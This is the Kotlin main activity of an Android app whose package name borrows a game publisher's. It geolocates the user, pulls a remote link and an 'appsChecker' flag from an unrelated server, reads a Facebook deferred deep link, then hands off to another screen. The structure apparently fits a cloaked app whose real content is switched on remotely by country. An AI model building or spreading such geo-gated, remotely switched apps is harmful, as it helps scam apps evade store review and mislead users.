package com.proximabeta.game.con

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.facebook.applinks.AppLinkData
import com.orhanobut.hawk.Hawk
import com.proximabeta.game.con.ThatClass.Companion.countryCode
import com.proximabeta.game.con.ThatClass.Companion.geo
import com.proximabeta.game.con.databinding.ActivityMainBinding
import kotlinx.coroutines.*
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit


class MainActivity : AppCompatActivity() {
    private lateinit var bindMainAct: ActivityMainBinding


    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        bindMainAct = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindMainAct.root)

        deePP(this)

        val executorService = Executors.newSingleThreadScheduledExecutor()
        var countCo: String? = Hawk.get(countryCode, null)
        var ge: String? = Hawk.get(geo, null)
        executorService.scheduleAtFixedRate({
            if (countCo != null && ge != null) {
                executorService.shutdown()
                intMain()
            } else {
                countCo = Hawk.get(countryCode)
                ge = Hawk.get(geo)
            }

        }, 0, 1, TimeUnit.SECONDS)

        GlobalScope.launch (Dispatchers.IO){
            jobMain
        }
    }


    private suspend fun getDataDev() {

        val retroBuildTwo = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://mesmerisingqueen.live/")
            .build()
            .create(ApiInter::class.java)
        val linkView = retroBuildTwo.getDataDev().body()?.view.toString()
        val appsChecker = retroBuildTwo.getDataDev().body()?.appsChecker.toString()
        val retroData = retroBuildTwo.getDataDev().body()?.geo.toString()


        Hawk.put(ThatClass.link, linkView)
        Hawk.put(ThatClass.appsCheck, appsChecker)
        Hawk.put(geo, retroData)

        Log.d("Data from Devil", linkView)
        Log.d("Data from Devil", appsChecker)
        Log.d("Data from Devil", retroData)

    }

    //Data API
    private suspend fun getData() {
    val retrofitBuilder = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(ApiInter::class.java)
        val retData = retrofitBuilder.getData().body()?.countryCode
        Log.d("Data from API", retData.toString())

        Hawk.put(countryCode, retData)
    }

    private val jobMain: Job = GlobalScope.launch (Dispatchers.IO){
        getData()
        getDataDev()
    }

    private fun intMain() {
        val intent = Intent(this@MainActivity, ADAct::class.java)
        startActivity(intent)
        finish()
    }

    fun deePP(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val params = appLinkData.targetUri.host.toString()
                Hawk.put(ThatClass.DEEPL, params)
            }
            if (appLinkData == null) {
            }
        }
    }
}